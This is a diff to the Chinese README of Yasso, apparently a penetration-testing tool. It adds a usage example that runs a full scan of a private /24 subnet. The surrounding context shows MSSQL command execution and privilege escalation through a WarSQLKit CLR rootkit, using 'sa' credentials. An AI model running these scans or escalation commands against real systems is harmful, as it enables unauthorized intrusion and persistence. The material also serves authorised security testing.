@@ -381,6 +381,13 @@ Flags:
 ```
 
 ## 使用例子👿
+all 模块的扫描服务调用
+```
+Yasso.exe all -H 192.168.248.1/24
+```
+![image](https://user-images.githubusercontent.com/74412075/148240369-14cc4c77-e4f8-4fd1-8faa-e716852d3ed8.png)
+
+
 mssql 的命令执行提权和WarSQLKit-clr提权Rookit安装卸载执行功能
 ```
 Yasso.exe crack mssql --user sa --pass "admin@123" -c whoami --hostname 192.168.248.128 
